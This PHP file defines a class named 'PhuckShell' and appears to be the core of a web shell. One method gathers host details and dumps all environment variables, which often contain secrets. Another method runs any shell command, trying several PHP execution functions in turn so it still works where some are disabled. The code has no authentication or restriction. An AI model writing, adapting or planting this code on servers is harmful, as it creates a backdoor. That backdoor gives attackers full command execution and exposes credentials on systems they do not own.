<?php

class PhuckShell
{
    /**
     * @return array
     */
    public static function env()
    {
        $arch = php_uname('m');
        $platform = array(
            'name' => php_uname('s'),
            'version' => php_uname('r'),
        );
        $variables = getenv();
        $hostname = php_uname('n');
        $tz = date_default_timezone_get();
        $user = getenv(stripos(PHP_OS, 'WIN') === 0 ? 'USERNAME' : 'USER');
        $home = getenv(stripos(PHP_OS, 'WIN') === 0 ? 'USERPROFILE' : 'HOME');
        $cwd = getcwd();
        $php = array(
            'sapi' => PHP_SAPI,
            'version' => PHP_VERSION,
            'extensions' => get_loaded_extensions(),
            'ini' => array(
                'path' => php_ini_loaded_file(),
                'values' => ini_get_all(null, false),
            ),
        );
        $ip = $_SERVER['REMOTE_ADDR'];
        return compact('arch', 'platform', 'variables', 'hostname', 'tz', 'user', 'home', 'cwd', 'php', 'ip');
    }

    /**
     * @param string $cwd
     * @param string $cmd
     * @return array|false
     */
    public static function exec($cwd, $cmd)
    {
        @chdir($cwd);
        if (function_exists('proc_open')) {
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
            );
            $process = proc_open($cmd, $descriptors, $pipes);
            if ($process) {
                $stdout = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $code = proc_close($process);
            } else {
                $code = -1;
            }

            if (empty($stdout)) {
                $stdout = '';
            }

            return compact('stdout', 'code');
        } elseif (function_exists('exec')) {
            exec($cmd, $stdout, $code);
            $stdout = empty($stdout) ? '' : implode("\n", $stdout);
            return compact('stdout', 'code');
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd, $code);
            $stdout = ob_get_flush();
            if (empty($stdout)) {
                $stdout = '';
            }

            return compact('stdout', 'code');
        } elseif (function_exists('shell_exec')) {
            $stdout = shell_exec($cmd);
            if (empty($stdout)) {
                $stdout = '';
            }

            $code = -1;
            return compact('stdout', 'code');
        }

        return false;
    }
}
